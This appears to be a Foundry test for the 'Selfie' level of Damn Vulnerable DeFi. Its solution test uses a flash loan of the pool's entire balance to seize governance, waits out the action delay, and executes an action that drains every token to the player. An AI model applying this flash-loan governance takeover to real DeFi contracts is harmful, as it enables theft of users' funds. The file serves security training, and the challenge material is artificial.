// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/vm.sol";
import "../src/levels/Selfie/SelfiePool.sol";
import "../src/levels/Selfie/SimpleGovernance.sol";
import "../src/levels/Selfie/FlashLoanReceiver.sol";

contract SelfieTest is DSTest {
    Vm private constant vm = Vm(HEVM_ADDRESS);
    uint256 constant TOKENS_IN_POOL = 1_500_000 ether;
    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000 ether;
    address constant deployer =
        address(uint160(uint256(keccak256("DEPLOYER"))));
    address constant player = address(uint160(uint256(keccak256("PLAYER"))));

    DamnValuableTokenSnapshot token;
    SimpleGovernance governance;
    SelfiePool pool;

    function setUp() public {
        vm.label(player, "Player");
        vm.startPrank(deployer);
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(address(token));

        assertEq(governance.getActionCounter(), 1);

        pool = new SelfiePool(address(token), address(governance));

        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));

        token.transfer(address(pool), TOKENS_IN_POOL);
        token.snapshot();

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);

        vm.stopPrank();
    }

    function testIsSelfieCleared() public {
        vm.startPrank(player);

        FlashLoanReceiver receiver = new FlashLoanReceiver(
            address(governance),
            address(pool)
        );

        vm.recordLogs();
        receiver.takeFlashLoan(address(token), TOKENS_IN_POOL);

        vm.warp(block.timestamp + governance.getActionDelay());

        governance.executeAction(1);

        vm.stopPrank();

        assertEq(token.balanceOf(player), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}
